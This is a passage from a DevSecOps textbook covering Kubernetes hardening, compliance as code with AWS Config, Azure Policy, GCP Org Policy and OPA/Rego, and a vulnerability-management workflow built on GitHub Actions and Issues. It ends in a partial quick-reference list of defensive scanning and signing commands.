```bash
# Install
brew install kube-score

# Scan a Kubernetes manifest
kube-score score ./kubernetes/deployment.yaml

# Scan all manifests in a directory
kube-score score ./kubernetes/*.yaml
```

**Common Kubernetes security issues:**

```yaml
# BAD: Running as root
spec:
  containers:
    - name: myapp
      image: myapp:latest
      # No securityContext - runs as root by default

# GOOD: Non-root with read-only filesystem
spec:
  containers:
    - name: myapp
      image: myapp:1.0.0
      securityContext:
        runAsNonRoot: true
        # Fail to start if image runs as root
        runAsUser: 1000
        # Run as UID 1000
        readOnlyRootFilesystem: true
        # Cannot write to filesystem (except explicitly mounted volumes)
        allowPrivilegeEscalation: false
        # Cannot gain more permissions than the parent process
        capabilities:
          drop:
            - ALL
          # Remove ALL Linux capabilities
          add:
            - NET_BIND_SERVICE
          # Only add back what's specifically needed
      resources:
        limits:
          cpu: "500m"
          memory: "256Mi"
        # Always set resource limits
        # Without limits, one pod can consume all node resources (DoS)
        requests:
          cpu: "100m"
          memory: "64Mi"
```

### Common Beginner Mistakes

**Mistake 1: Not scanning Terraform modules.**
If you use third-party Terraform modules, Checkov/tfsec should scan the module code too. Don't assume external modules are secure.

**Mistake 2: Suppressing checks without documentation.**
Every suppressed check (`#tfsec:ignore`, `checkov:skip`) should have a comment explaining *why* it's suppressed. Without documentation, future engineers don't know if the suppression is still valid.

**Mistake 3: Only scanning changes, not the full state.**
IaC scanners should also run against the full current state of your infrastructure repository, not just the changed files in a PR. An existing misconfiguration doesn't get fixed just because you didn't touch it.

**Mistake 4: Ignoring MEDIUM severity.**
In IaC scanning, MEDIUM findings are often real security issues — missing encryption, insufficient logging, overly permissive IAM roles. Don't dismiss them.

### How This Works in the Real World

At companies with mature IaC security practices:

1. **Pre-commit hooks** run tfsec on staged Terraform changes in seconds
2. **PR checks** run Checkov against all modified IaC files — CRITICAL and HIGH block merges
3. **Scheduled scans** run Checkov against the entire IaC repository weekly, catching drift and newly discovered checks
4. **CSPM tools** (AWS Security Hub, Prisma Cloud) scan the live cloud environment and link findings back to the IaC code that created them

### Key Takeaways

- IaC security scanning applies shift-left to infrastructure — catching misconfigurations before resources are created
- Checkov is the most comprehensive tool, supporting Terraform, CloudFormation, Kubernetes, Docker, and more
- tfsec is faster for pure Terraform workflows
- KICS has the broadest IaC format support
- Kubernetes security context settings (non-root, read-only filesystem, dropped capabilities) should be standard in all deployments
- Always document suppressed checks with clear justification

### Practical Task (from Chapter 5/10): Checkov on Terraform, Trivy on Dockerfiles — Zero HIGH Findings

*(See the end of Chapter 5 for the full combined task, which covers both Trivy and Checkov together.)*

---

## Chapter 11: Compliance as Code {#chapter-11}

### Compliance Is Not a Document, It's a State

Traditional compliance is a periodic exercise. Once a year, auditors arrive with a checklist. They ask for evidence that certain controls are in place. Teams scramble to produce screenshots, spreadsheets, and documentation. The audit passes. Everyone goes back to their normal work until the next audit.

The problem: compliance is only verified at that one moment. Between audits, configurations drift, new resources are provisioned without controls, and policies are violated without anyone noticing.

**Compliance as Code** treats compliance controls not as a documentation exercise but as automated, continuously enforced rules. Instead of "show me evidence that your S3 buckets are encrypted" (an annual question), it becomes "S3 buckets that aren't encrypted are automatically flagged and remediated" (a continuous state).

This is possible because cloud platforms (AWS, Azure, GCP) provide APIs for defining and enforcing configuration policies across all resources. Any resource that violates a policy is flagged in real-time, and some violations can be auto-remediated.

### AWS Config

**AWS Config** is the AWS service for continuous compliance monitoring. It:
- Records the configuration of every AWS resource
- Evaluates resources against **Config Rules** (compliance checks)
- Records the history of configuration changes
- Provides a compliance dashboard
- Can trigger auto-remediation for certain violations

**Enabling AWS Config via Terraform:**

```hcl
# Enable AWS Config recording
resource "aws_config_configuration_recorder" "main" {
  name     = "main-recorder"
  role_arn = aws_iam_role.config.arn
  # The IAM role that Config uses to read resource configurations

  recording_group {
    all_supported = true
    # Record configuration changes for ALL supported resource types
    include_global_resource_types = true
    # Include global resources like IAM users and roles
  }
}

# Configure where Config stores its data
resource "aws_config_delivery_channel" "main" {
  name           = "main-channel"
  s3_bucket_name = aws_s3_bucket.config.bucket
  # Store Config snapshots and history in this S3 bucket

  snapshot_delivery_properties {
    delivery_frequency = "Six_Hours"
    # How often to deliver a full snapshot of all resource configurations
  }

  depends_on = [aws_config_configuration_recorder.main]
}

# Enable recording
resource "aws_config_configuration_recorder_status" "main" {
  name       = aws_config_configuration_recorder.main.name
  is_enabled = true
  depends_on = [aws_config_delivery_channel.main]
}
```

**Adding managed Config Rules:**

```hcl
# Rule: S3 buckets must not allow public read access
resource "aws_config_config_rule" "s3_no_public_read" {
  name = "s3-bucket-no-public-read"

  source {
    owner             = "AWS"
    source_identifier = "S3_BUCKET_PUBLIC_READ_PROHIBITED"
    # AWS managed rule - uses AWS-provided logic
    # 'AWS' = this rule is managed by AWS, not custom
  }

  depends_on = [aws_config_configuration_recorder.main]
}

# Rule: EC2 instances must use IMDSv2 (not the less secure IMDSv1)
resource "aws_config_config_rule" "ec2_imdsv2" {
  name = "ec2-imdsv2-check"

  source {
    owner             = "AWS"
    source_identifier = "EC2_IMDSV2_CHECK"
  }
}

# Rule: CloudTrail must be enabled in all regions
resource "aws_config_config_rule" "cloudtrail_enabled" {
  name = "cloud-trail-enabled"

  source {
    owner             = "AWS"
    source_identifier = "CLOUD_TRAIL_ENABLED"
  }
}

# Rule: MFA must be enabled for root account
resource "aws_config_config_rule" "root_mfa" {
  name = "root-account-mfa-enabled"

  source {
    owner             = "AWS"
    source_identifier = "ROOT_ACCOUNT_MFA_ENABLED"
  }
}
```

**Auto-remediation for S3 public access:**

```hcl
# Automatically remediate S3 buckets that have public read access enabled
resource "aws_config_remediation_configuration" "s3_public_read" {
  config_rule_name = aws_config_config_rule.s3_no_public_read.name
  # Which Config rule to attach remediation to

  target_type = "SSM_DOCUMENT"
  # SSM (Systems Manager) automation documents are used for remediation

  target_id = "AWS-DisableS3BucketPublicReadWrite"
  # The SSM document that performs the remediation action

  parameter {
    name         = "AutomationAssumeRole"
    static_value = aws_iam_role.remediation.arn
    # The IAM role that the automation will use
  }

  parameter {
    name           = "S3BucketName"
    resource_value = "RESOURCE_ID"
    # RESOURCE_ID is automatically replaced with the non-compliant S3 bucket name
  }

  automatic = true
  # Automatically trigger remediation when the rule fires (no human approval needed)
  
  maximum_automatic_attempts = 5
  # Try remediation up to 5 times before giving up
  
  retry_attempt_seconds = 60
  # Wait 60 seconds between retry attempts
}
```

**AWS Security Hub: Aggregating compliance findings**

AWS Security Hub aggregates findings from multiple AWS services (Config, GuardDuty, Inspector, Macie) and third-party tools into a unified dashboard. It maps findings to security frameworks like CIS AWS Foundations Benchmark, AWS Foundational Security Best Practices, and PCI-DSS.

```hcl
# Enable AWS Security Hub
resource "aws_securityhub_account" "main" {}

# Enable built-in security standards
resource "aws_securityhub_standards_subscription" "cis" {
  standards_arn = "arn:aws:securityhub:us-east-1::standards/cis-aws-foundations-benchmark/v/1.4.0"
  # CIS AWS Foundations Benchmark - industry standard security baseline
  depends_on    = [aws_securityhub_account.main]
}

resource "aws_securityhub_standards_subscription" "foundational" {
  standards_arn = "arn:aws:securityhub:us-east-1::standards/aws-foundational-security-best-practices/v/1.0.0"
  depends_on    = [aws_securityhub_account.main]
}
```

### Azure Policy

**Azure Policy** is Azure's compliance enforcement service. It allows you to define rules that all Azure resources must comply with, with options for audit, deny, and automated remediation.

**Defining an Azure Policy with Terraform:**

```hcl
# Policy: Require HTTPS for Storage Accounts
resource "azurerm_policy_definition" "require_https_storage" {
  name         = "require-https-storage"
  policy_type  = "Custom"
  # Custom policy defined by us
  mode         = "All"
  # Apply to all resource types
  display_name = "Require HTTPS for Storage Accounts"

  policy_rule = <<POLICY_RULE
{
  "if": {
    "allOf": [
      {
        "field": "type",
        "equals": "Microsoft.Storage/storageAccounts"
      },
      {
        "field": "Microsoft.Storage/storageAccounts/supportsHttpsTrafficOnly",
        "notEquals": "true"
      }
    ]
  },
  "then": {
    "effect": "deny"
  }
}
POLICY_RULE
# If the resource is a storage account AND HTTPS-only is not enabled → deny creation
}

# Assign the policy to a subscription
resource "azurerm_subscription_policy_assignment" "https_storage" {
  name                 = "require-https-storage-assignment"
  policy_definition_id = azurerm_policy_definition.require_https_storage.id
  subscription_id      = data.azurerm_subscription.current.id
  # Apply to all resources in the entire subscription
}
```

### GCP Organization Policy

**GCP Organization Policy** allows you to enforce constraints across an entire GCP organisation or specific folders and projects:

```hcl
# Policy: Prevent public cloud storage buckets across the organisation
resource "google_org_policy_policy" "no_public_storage" {
  name   = "organizations/${var.org_id}/policies/storage.publicAccessPrevention"
  parent = "organizations/${var.org_id}"
  # Apply to the entire GCP organisation

  spec {
    rules {
      enforce = true
      # 'true' = this constraint is enforced
      # Storage buckets cannot be made publicly accessible anywhere in the org
    }
  }
}

# Policy: Require OS Login for all VMs
resource "google_org_policy_policy" "require_os_login" {
  name   = "organizations/${var.org_id}/policies/compute.requireOsLogin"
  parent = "organizations/${var.org_id}"

  spec {
    rules {
      enforce = true
      # Require OS Login (Google-managed SSH access) for all Compute VMs
    }
  }
}
```

### Open Policy Agent (OPA) / Rego

**Open Policy Agent (OPA)** is a general-purpose policy engine used across the cloud-native ecosystem — Kubernetes admission control, Terraform plan evaluation, CI/CD gates, and more. Policies are written in **Rego**, OPA's policy language.

**A Rego policy for Kubernetes: Require resource limits:**

```rego
# File: policies/require-resource-limits.rego

package kubernetes.admission
# This policy is in the kubernetes.admission package

deny[msg] {
  # A denial is produced when ALL of the following are true:

  input.request.kind.kind == "Pod"
  # The incoming request is for a Pod resource

  container := input.request.object.spec.containers[_]
  # For each container in the pod (using _ as a wildcard index)

  not container.resources.limits.cpu
  # The container does NOT have a CPU limit set

  msg := sprintf("Container '%v' must have a CPU limit", [container.name])
  # The denial message shown to the user
}

deny[msg] {
  input.request.kind.kind == "Pod"
  container := input.request.object.spec.containers[_]
  not container.resources.limits.memory
  msg := sprintf("Container '%v' must have a memory limit", [container.name])
}
```

**Using OPA with conftest to test Terraform plans:**

```bash
# Install conftest
brew install conftest

# Write a Rego policy for Terraform
cat > policies/no_public_s3.rego << 'EOF'
package main

deny[msg] {
  resource := input.resource_changes[_]
  resource.type == "aws_s3_bucket_public_access_block"
  resource.change.after.block_public_acls == false
  msg := sprintf("S3 bucket '%v' must block public ACLs", [resource.address])
}
EOF

# Generate a Terraform plan
terraform plan -out=tfplan.binary
terraform show -json tfplan.binary > tfplan.json

# Evaluate the plan against your policies
conftest test tfplan.json --policy policies/
```

### Common Beginner Mistakes

**Mistake 1: Audit mode without remediation.**
Running Config rules in "audit" mode records violations but doesn't fix them. Start with audit mode to understand your current state, then move to auto-remediation for well-understood violations.

**Mistake 2: Policy overload.**
Enabling hundreds of policies at once, all in deny mode, will break deployments. Start with a curated baseline (CIS Benchmark Level 1) in audit mode. Gradually move policies to enforce mode after validating they don't break existing workflows.

**Mistake 3: Not testing policies in staging first.**
A policy that blocks creation of any non-encrypted resource might break your deployment pipeline if it depends on an unencrypted resource. Always test in a non-production account or subscription first.

### How This Works in the Real World

Large enterprises use Compliance as Code to achieve:
- **Continuous compliance:** Instead of annual audits, compliance posture is measured in real-time
- **Drift detection:** When a human makes a manual change in the console that violates policy, it's detected and alerted immediately
- **Audit evidence generation:** Compliance platforms automatically generate reports showing which controls are in place and for how long — dramatically simplifying audit preparation

### Key Takeaways

- Compliance as Code enforces security controls continuously and automatically, not periodically
- AWS Config provides managed compliance rules with auto-remediation capability
- Azure Policy and GCP Organization Policy enforce controls at the organisation/subscription level
- OPA/Rego provides a general-purpose policy engine that works across Kubernetes, Terraform, and CI/CD
- Start with audit mode, understand your baseline, then enable enforcement
- Auto-remediation is powerful but must be tested carefully to avoid breaking deployments

### Practical Task: Configure AWS Config — Enable All Managed Rules, Set Up Auto-Remediation for S3 Public Buckets

**Task:**

1. Set up a Terraform project that enables AWS Config in a test AWS account
2. Enable the following AWS Config managed rules:
   - `S3_BUCKET_PUBLIC_READ_PROHIBITED`
   - `S3_BUCKET_SERVER_SIDE_ENCRYPTION_ENABLED`
   - `EC2_IMDSV2_CHECK`
   - `CLOUD_TRAIL_ENABLED`
   - `ROOT_ACCOUNT_MFA_ENABLED`
   - `IAM_PASSWORD_POLICY`
3. Configure auto-remediation for the `S3_BUCKET_PUBLIC_READ_PROHIBITED` rule using the `AWS-DisableS3BucketPublicReadWrite` SSM document
4. Create an S3 bucket without the public access block (to trigger the rule)
5. Verify the bucket appears as non-compliant in the AWS Config console
6. Verify auto-remediation applies the public access block automatically
7. Enable AWS Security Hub and subscribe to the CIS AWS Foundations Benchmark
8. Document all findings from the CIS Benchmark and create a remediation plan for the top five findings

**Expected output:** Terraform code for Config rules and auto-remediation, evidence of a non-compliant resource being detected and auto-remediated, and a documented CIS Benchmark compliance gap analysis for your test account.

---

## Chapter 12: Vulnerability Management {#chapter-12}

### From Scanning to Acting: The Full Lifecycle

Scanning for vulnerabilities is the easy part. What do you do with the results?

A company that scans everything but has no process for acting on findings is in some ways worse off than a company that doesn't scan — it knows about its vulnerabilities but does nothing about them. This is known as "vulnerability debt," and it accumulates fast.

**Vulnerability management** is the process of systematically finding, classifying, prioritising, assigning, tracking, and remediating security vulnerabilities. It's the operational layer on top of all the scanning tools we've covered in this book.

### The CVE Lifecycle

Every significant vulnerability is assigned a **CVE** (Common Vulnerabilities and Exposures) identifier:

```
CVE-2021-44228
│
├── Year of disclosure: 2021
└── Unique ID:          44228
```

The CVE lifecycle:

1. **Discovery:** A researcher or security team finds a vulnerability
2. **Responsible disclosure:** The researcher notifies the vendor privately (typically 90-day embargo)
3. **CVE ID reservation:** A CVE numbering authority (CNA) assigns a CVE ID
4. **Patch development:** The vendor develops and tests a fix
5. **Public disclosure:** The CVE is published with details, CVSS score, and fix information
6. **NVD analysis:** The National Vulnerability Database enriches the CVE with CVSS scores
7. **Exploitation in the wild:** Attackers begin exploiting; proof-of-concept exploits appear

The gap between steps 6 and 7 is sometimes hours (Log4Shell: exploitation began within 12 hours of disclosure). The time between publication and when you detect and patch is your **exposure window**.

### CVSS Scoring: Understanding Severity

**CVSS** (Common Vulnerability Scoring System) provides a standardised way to rate the severity of vulnerabilities. The current version is CVSS v3.1.

CVSS scores range from 0.0 to 10.0:

| Score | Severity |
|---|---|
| 0.0 | None |
| 0.1–3.9 | Low |
| 4.0–6.9 | Medium |
| 7.0–8.9 | High |
| 9.0–10.0 | Critical |

CVSS is calculated from multiple metrics:

**Base Score metrics (what the vulnerability is):**
- **Attack Vector (AV):** Network (N), Adjacent (A), Local (L), Physical (P) — Network = worst
- **Attack Complexity (AC):** Low (L) or High (H) — Low = worst
- **Privileges Required (PR):** None (N), Low (L), High (H) — None = worst
- **User Interaction (UI):** None (N) or Required (R) — None = worst
- **Scope (S):** Unchanged (U) or Changed (C) — Changed = worse
- **Confidentiality Impact (C):** High (H), Low (L), None (N)
- **Integrity Impact (I):** High (H), Low (L), None (N)
- **Availability Impact (A):** High (H), Low (L), None (N)

Log4Shell's CVSS: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 10.0
- Network exploitable, low complexity, no privileges, no user interaction, full impact

**Temporal and Environmental scores** can modify the base score based on whether an exploit is available (Temporal) and how important the affected asset is to your organisation (Environmental). This is key: a CRITICAL vulnerability in an isolated development server is not as urgent as a MEDIUM vulnerability in your customer-facing payment system.

### Establishing Remediation SLAs

An SLA (Service Level Agreement) for vulnerability remediation defines how quickly your team must fix vulnerabilities based on their severity:

| Severity | Remediation SLA | Notes |
|---|---|---|
| Critical (9.0–10.0) | 24–48 hours | Immediate escalation; may require emergency change |
| High (7.0–8.9) | 7 days | Priority ticket; must not slip |
| Medium (4.0–6.9) | 30 days | Normal sprint work |
| Low (0.1–3.9) | 90 days | Batch remediation |

SLAs should be adjusted for context:
- Is the vulnerable component internet-facing? Tighten the SLA.
- Is a known exploit available in the wild? Treat as one severity higher.
- Is the vulnerable component in a compliance scope (PCI, SOC 2)? Tighten the SLA.

### The Exception Process

Not every vulnerability can be fixed immediately. Sometimes:
- The fix requires a major version upgrade that breaks the application
- The vulnerable component is in code scheduled for replacement in 30 days
- The vulnerability is in a component that is not reachable (not exposed, mitigated by other controls)

The **exception process** allows a vulnerability to be formally accepted as a risk rather than fixed:

An exception request should include:
1. The CVE/vulnerability ID and CVSS score
2. The affected asset and its business criticality
3. Why the vulnerability cannot be remediated by the SLA
4. What compensating controls are in place (if any)
5. The proposed alternative remediation date
6. The approval from the security team and asset owner

Exceptions must be time-limited (90 days maximum is common), reviewed at expiry, and tracked in your vulnerability management system.

### Building a Vulnerability Management Workflow

Here is a complete end-to-end vulnerability management workflow using GitHub Issues as the tracking system:

**Step 1: Continuous scanning**

```yaml
# .github/workflows/weekly-scan.yml

name: Weekly Vulnerability Scan

on:
  schedule:
    - cron: '0 6 * * 1'   # Every Monday at 6am

jobs:
  scan-and-report:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Run Grype scan
        run: |
          grype dir:. --output json --file grype-results.json
          # Scan the entire repository
          # -output json = machine-readable output for processing
          # -file        = write output to this file

      - name: Run pip-audit
        run: |
          pip install pip-audit
          pip-audit --format json --output pip-audit-results.json -r requirements.txt

      - name: Process results and create GitHub Issues
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            
            // Read Grype results
            const grypeResults = JSON.parse(fs.readFileSync('grype-results.json', 'utf8'));
            
            // Filter HIGH and CRITICAL vulnerabilities
            const highCritical = grypeResults.matches.filter(m => 
              ['High', 'Critical'].includes(m.vulnerability.severity)
            );
            
            // Create a GitHub Issue for each finding
            for (const finding of highCritical) {
              const vuln = finding.vulnerability;
              const pkg = finding.artifact;
              
              // Determine SLA based on severity
              const sla = vuln.severity === 'Critical' ? 2 : 7;
              const dueDate = new Date();
              dueDate.setDate(dueDate.getDate() + sla);
              
              await github.rest.issues.create({
                owner: context.repo.owner,
                repo: context.repo.repo,
                title: `[Security] ${vuln.severity}: ${vuln.id} in ${pkg.name}@${pkg.version}`,
                body: `## Vulnerability Details\n\n` +
                      `**CVE:** ${vuln.id}\n` +
                      `**Severity:** ${vuln.severity}\n` +
                      `**Package:** ${pkg.name} ${pkg.version}\n` +
                      `**Fixed in:** ${vuln.fix.versions.join(', ')}\n` +
                      `**Description:** ${vuln.description}\n\n` +
                      `## SLA\n\n` +
                      `This vulnerability must be remediated by: **${dueDate.toDateString()}**\n\n` +
                      `## Remediation\n\n` +
                      `Upgrade \`${pkg.name}\` to version \`${vuln.fix.versions[0]}\` or later.`,
                labels: ['security', vuln.severity.toLowerCase()],
                // Apply labels based on severity for easy filtering
              });
            }
```

**Step 2: Triage workflow**

When a security issue is created, it should be triaged within 24 hours:

```markdown
# Triage Checklist
- [ ] Verify finding is not a false positive
- [ ] Confirm affected version is actually deployed
- [ ] Check if a fix is available
- [ ] Assess actual exploitability in our environment (environmental score)
- [ ] Assign to appropriate owner (team/person)
- [ ] Set milestone based on SLA
- [ ] Apply appropriate labels: confirmed, false-positive, exception-requested
```

**Step 3: Tracking and reporting**

GitHub Projects provides Kanban-style tracking:
- **Columns:** New → Triaged → In Progress → Resolved → Exception Approved
- **Labels:** `severity:critical`, `severity:high`, `false-positive`, `exception`
- **Milestones:** Named by SLA date ("Critical - Due 2024-01-17")

Weekly reports can be generated by querying the GitHub API:

```python
import requests
from datetime import datetime

# Get all open security issues past their due date
response = requests.get(
    "https://api.github.com/repos/org/repo/issues",
    params={
        "labels": "security",
        "state": "open",
    },
    headers={"Authorization": f"Bearer {GITHUB_TOKEN}"}
)

issues = response.json()
overdue = [
    issue for issue in issues
    if issue.get('milestone') and
    datetime.fromisoformat(issue['milestone']['due_on'].replace('Z', '')) < datetime.now()
]

print(f"Overdue security issues: {len(overdue)}")
for issue in overdue:
    print(f"  #{issue['number']}: {issue['title']}")
```

### Mean Time to Remediate (MTTR)

A key metric for vulnerability management is **MTTR** — the average time between a vulnerability being discovered and being fully remediated. Track this by severity level.

Industry benchmarks:
- Critical: < 48 hours
- High: < 7 days
- Medium: < 30 days

Calculate MTTR from GitHub Issues:
```
MTTR = (date issue closed) - (date issue opened)
```

### Common Beginner Mistakes

**Mistake 1: Treating all vulnerabilities as equal priority.**
A 10,000-vulnerability backlog is paralysing. Prioritise ruthlessly: Critical and High with public exploits, on internet-facing services, in compliance scope. Everything else can wait.

**Mistake 2: Assigning vulnerabilities to "security team".**
Security teams are too small to fix all vulnerabilities. The security team should own the *process* — triaging, setting SLAs, reviewing exceptions — while the *development teams* own the actual fixes.

**Mistake 3: Not tracking false positives.**
When a finding is a false positive, close the issue, label it `false-positive`, and document why. This builds institutional knowledge and helps improve scanner configuration.

**Mistake 4: Scanning without fixing.**
Scans without a remediation workflow generate anxiety, not security. The measure of vulnerability management is not how many vulnerabilities you find — it's how quickly you fix them.

### How This Works in the Real World

Enterprise vulnerability management programs typically use dedicated tools like:
- **Snyk:** Combines scanning and tracking; integrates directly with Jira and GitHub
- **Tenable.io / Qualys:** Enterprise vulnerability management platforms with full lifecycle tracking
- **DefectDojo:** Open-source vulnerability management tool that aggregates findings from all your scanners

Security teams produce weekly/monthly metrics for engineering leadership:
- Total open vulnerabilities by severity
- SLA compliance rate (what % are fixed within the SLA)
- MTTR by severity level
- Vulnerability backlog trend (growing or shrinking?)

### Key Takeaways

- Vulnerability management is the process of systematically finding, prioritising, tracking, and remediating vulnerabilities
- CVE identifiers provide a universal reference for vulnerabilities; CVSS scores provide standardised severity ratings
- Remediation SLAs define how quickly vulnerabilities must be fixed based on severity (Critical: 48h, High: 7d, Medium: 30d)
- The exception process provides a formal path for accepting risk when immediate remediation is not possible
- GitHub Issues can serve as a lightweight but effective vulnerability tracking system
- MTTR (Mean Time to Remediate) is the key metric for measuring program effectiveness

### Practical Task: Build a Vulnerability Management Workflow — Scan Weekly, Triage Findings, Assign SLAs, Track in GitHub Issues

**Task:**

1. Set up a repository with a Python application that has intentional vulnerable dependencies
2. Create a GitHub Actions workflow that:
   - Runs every Monday at 6am
   - Runs both Grype and pip-audit
   - Parses the JSON output
   - Creates a GitHub Issue for each HIGH or CRITICAL finding with:
     - CVE ID and severity as the issue title
     - Full vulnerability details in the body
     - Appropriate labels (`security`, `severity:high` or `severity:critical`)
     - A milestone set to the SLA date (Critical = 2 days, High = 7 days)
3. Create a GitHub Project (Kanban board) with columns: New, Triaged, In Progress, Resolved, Exception
4. Write a triage guide document (TRIAGE.md) that explains:
   - How to determine if a finding is a false positive
   - How to calculate the environmental CVSS score for your application
   - When to request an exception vs. fix immediately
5. Add a second weekly workflow that comments on any security issues past their milestone due date
6. Fix two of the vulnerabilities by upgrading the packages
7. Request an exception (close the issue with documentation) for one vulnerability with a justified reason

**Expected output:** A fully functional vulnerability management workflow in GitHub, a populated project board with real vulnerability findings, the triage guide, and documentation showing the full lifecycle of at least three vulnerabilities (fixed, false-positive, exception).

---

## Final Chapter: Connecting Everything in a Real-World DevSecOps Pipeline {#final-chapter}

### The Bigger Picture

You now have twelve chapters of tools, practices, and frameworks. Let's zoom out and see how they form a coherent, automated security system.

### The Complete DevSecOps Pipeline

Imagine a single code change — a developer fixes a bug in a Python REST API. Here is what happens automatically as that code moves from keyboard to production:

```
DEVELOPER'S MACHINE
├── IDE Plugin (Snyk/Semgrep)
│   └── Flags vulnerability as the developer types
└── Pre-commit hooks (gitleaks, tfsec)
    └── Blocks commit if secrets or IaC issues found

          ↓  git push / pull request opened

PULL REQUEST CHECKS (CI - GitHub Actions)
├── Semgrep (SAST)
│   └── Scans changed Python files for code vulnerabilities
│   └── Blocks PR on HIGH/CRITICAL findings
├── CodeQL (SAST - deep analysis)
│   └── Data flow analysis across entire codebase
├── Snyk / pip-audit (SCA)
│   └── Checks dependency changes for new CVEs
│   └── Blocks PR on CRITICAL dependency vulnerabilities
├── Checkov / tfsec (IaC)
│   └── Scans any changed Terraform files
│   └── Blocks PR on HIGH findings
└── TruffleHog (Secrets)
    └── Scans full Git history for new secrets
    └── Blocks PR if secrets found

          ↓  PR approved and merged to main

MAIN BRANCH CI (Full build + security)
├── Build Docker image
├── Trivy (Container scanning)
│   └── Scans built image for OS and library CVEs
│   └── Fails build on CRITICAL container vulnerabilities
├── Syft (SBOM generation)
│   └── Generates CycloneDX SBOM for the container image
├── Cosign (Image signing)
│   └── Signs the image and attaches SBOM to registry entry
├── slsa-github-generator (Provenance)
│   └── Generates and signs SLSA provenance
└── OWASP ZAP (DAST)
    └── Runs against ephemeral test deployment
    └── Fails build on HIGH DAST findings

          ↓  All checks pass

DEPLOYMENT (Production)
├── Cosign verify
│   └── Verifies image signature before deployment
├── SLSA verify
│   └── Verifies provenance before deployment
└── AWS Config / OPA
    └── Validates deployment against compliance policies
    └── Blocks deployment if policies violated

          ↓  Deployed to production

PRODUCTION MONITORING
├── AWS Security Hub / Config
│   └── Continuously monitors cloud resource configurations
│   └── Alerts on compliance drift
├── Weekly SCA scans (Grype, Snyk)
│   └── Checks SBOM against new CVE publications
│   └── Creates GitHub Issues for new HIGH/CRITICAL findings
└── Vulnerability management workflow
    └── Tracks, triages, and assigns findings
    └── Monitors SLA compliance
    └── Generates weekly security metrics
```

### How the Concepts Map to the Pipeline

| Tool/Practice | Stage | What it prevents |
|---|---|---|
| Semgrep, Bandit, ESLint | PR | Code-level vulnerabilities |
| CodeQL | PR | Complex code vulnerabilities (data flow) |
| Snyk, Grype, pip-audit | PR + Weekly | Known vulnerable dependencies |
| TruffleHog, gitleaks | Pre-commit + PR | Credential exposure |
| Checkov, tfsec | PR | Infrastructure misconfigurations |
| Trivy | CI build | Container image vulnerabilities |
| Syft + Cosign | CI build | Untracked components, image tampering |
| SLSA provenance | CI release | Build system compromise |
| OWASP ZAP | CI | Runtime web application vulnerabilities |
| AWS Config, Azure Policy | Deployment | Cloud misconfiguration |
| SBOM + Dependency-Track | Ongoing | Undetected dependency vulnerabilities |
| Vulnerability management | Ongoing | Untracked and unresolved findings |

### The Security Policy Document

A DevSecOps program needs a policy document that defines the rules all teams must follow. This is the final practical task.

### Practical Task: Write a Security Policy Document

**Task:**

Write a formal security policy document for your organisation (real or fictional) that covers the following sections:

**Section 1: Approved Base Images**
- Which container base images are approved for production use and why
- The version pinning policy
- The update cadence (how often base images must be refreshed)
- The process for requesting approval of a new base image

**Section 2: Required SAST Tools and Thresholds**
- Which SAST tools must run in CI for which language/framework combinations
- The severity threshold that blocks PR merging
- The false positive suppression process (how to suppress with justification)
- The code coverage requirement for SAST scans

**Section 3: Dependency Management Rules**
- The SCA tools required in CI pipelines
- The severity threshold that blocks PR merging
- The patch policy (how quickly must dependency updates be applied)
- The lock file policy

**Section 4: Secrets Management Rules**
- What constitutes a secret (define the categories)
- Approved secrets management solutions (Vault, AWS Secrets Manager, etc.)
- Pre-commit hook requirements
- CI secrets scanning requirements
- The incident response process for a discovered secret

**Section 5: Build and Release Security**
- SLSA level target for production software
- Image signing requirements
- SBOM generation requirements
- Provenance verification requirements for third-party dependencies

**Section 6: Vulnerability Management SLAs**
- Remediation SLAs by severity level
- The exception process (application, approval, duration, review)
- Metrics and reporting cadence
- Roles and responsibilities

**Section 7: Compliance and Audit**
- Which compliance frameworks apply (CIS, PCI-DSS, SOC 2, etc.)
- Compliance as Code tooling requirements
- Audit evidence generation process

**Expected output:** A professional, 4–8 page security policy document that could be handed to a new engineering team to onboard them to the security requirements of your DevSecOps programme. This document is identical in nature to the security policies that Security Engineers and DevSecOps Architects produce at real organisations. It becomes a living document, versioned in Git alongside the code it governs.

---

### From Student to Practitioner

You have now covered the complete landscape of DevSecOps and supply chain security at a level that is directly applicable in professional Cloud and DevOps Engineering roles.

Here is what you can now do:

**You can protect the code:**
- Integrate SAST tools (Semgrep, Bandit, CodeQL) into CI pipelines
- Catch dependency vulnerabilities before they reach production
- Prevent secrets from ever entering a repository

**You can protect the build:**
- Generate and verify SLSA provenance
- Sign and attest container images
- Maintain SBOMs for every deployable artifact

**You can protect the infrastructure:**
- Scan Terraform and Kubernetes configurations for security issues
- Enforce compliance policies as automated code
- Detect and auto-remediate cloud misconfigurations

**You can manage the process:**
- Run a structured vulnerability management programme
- Establish and track SLAs
- Write security policies that govern how your organisation builds software

**You understand the threat landscape:**
- You know how supply chain attacks work and how to defend against them
- You can threat model a system and identify its supply chain risks
- You can explain the lessons of SolarWinds and Log4Shell to stakeholders

The tools will change. New CVEs will be discovered, new frameworks will emerge, new attack techniques will be invented. But the principles in this book — shift left, automate everything, verify rather than trust, treat compliance as a continuous state — these are durable. They are the foundations on which every future security tool and framework will be built.

Your job now is to apply these concepts to real systems. Not perfectly — no system is perfectly secure. But consistently, progressively, and with the knowledge that every check you add to a pipeline, every SBOM you generate, and every exception process you document is a real reduction in real risk.

---

*End of Book*

---

## Quick Reference: Tools and Commands

### SAST
```bash
# Semgrep
semgrep --config=auto .
semgrep --config=p/owasp-top-ten .

# Bandit (Python)
bandit -r ./app -f json -o bandit-results.json

# ESLint Security
npx eslint src/ --format json -o eslint-results.json
```

### SCA
```bash
# Snyk
snyk test
snyk test --file=requirements.txt --package-manager=pip
snyk test --severity-threshold=high

# Grype
grype dir:. --fail-on high -o json > grype-results.json
grype sbom:sbom.cyclonedx.json

# pip-audit
pip-audit -r requirements.txt --format json

# npm audit
npm audit --audit-level=high --json
```

### Container Security
```bash
# Trivy
trivy image --severity HIGH,CRITICAL --exit-code 1 myapp:latest
trivy config ./Dockerfile

# Syft (SBOM)
syft myapp:latest -o cyclonedx-json=sbom.json
syft dir:. -o spdx-json=sbom-source.json

# Cosign
cosign sign --yes ghcr.io/org/repo:tag
cosign verify ghcr.io/org/repo:tag
cosign attach sbom --sbom sbom.json ghcr.io/org/repo:tag
```

### Secrets Scanning
```bash
# TruffleHog
trufflehog git file://. --only-verified

# gitleaks
